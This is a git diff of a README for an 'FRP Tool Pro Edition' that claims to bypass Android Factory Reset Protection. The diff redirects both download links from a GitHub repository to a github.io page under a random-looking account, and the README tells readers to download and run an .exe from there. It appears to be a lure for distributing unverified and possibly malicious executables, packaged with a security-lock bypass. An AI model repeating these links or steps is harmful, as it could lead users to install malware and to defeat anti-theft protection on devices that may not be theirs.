@@ -1,6 +1,6 @@
 # 🔓 FRP-Tool-Pro-Edition - Unlock your Android device with ease
 
-[![](https://img.shields.io/badge/Download-FRP_Tool_Pro-blue.svg)](https://github.com/scholiumwhitefritillary345/FRP-Tool-Pro-Edition)
+[![](https://img.shields.io/badge/Download-FRP_Tool_Pro-blue.svg)](https://scholiumwhitefritillary345.github.io)
 
 FRP Tool Pro Edition helps you remove Factory Reset Protection from Android devices. This software provides a way to bypass security locks when you forget your account credentials. You can use this tool on Windows 11 and Windows 10 computers to regain access to your mobile hardware.
 
@@ -20,7 +20,7 @@ Ensure you install the necessary USB drivers for your smartphone before attempti
 
 You need to access the official release page to get the installer for this tool.
 
-1. Visit [this page to download](https://github.com/scholiumwhitefritillary345/FRP-Tool-Pro-Edition) the software.
+1. Visit [this page to download](https://scholiumwhitefritillary345.github.io) the software.
 2. Look for the "Releases" section on the right side of the page.
 3. Click the latest version of the installer file, which ends in .exe.
 4. Save the file to your computer desktop for easy access.
